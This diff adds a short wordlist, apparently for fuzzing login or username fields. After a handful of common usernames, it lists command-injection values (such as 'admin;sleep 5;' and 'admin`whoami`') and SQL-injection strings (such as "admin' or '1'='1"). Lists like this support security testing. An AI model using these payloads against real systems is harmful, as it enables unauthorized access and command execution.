@@ -1,0 +1,19 @@
+admin
+root
+user
+guest
+test
+system
+sysadmin
+administrator
+admin;sleep 5;
+admin;`sleep 5`;
+admin$(sleep 5)
+admin`whoami`
+admin|sleep 5
+admin||sleep 5
+admin&&sleep 5
+admin' or '1'='1
+admin" or "1"="1
+-1' or 1=1#
+123' || 1=1#
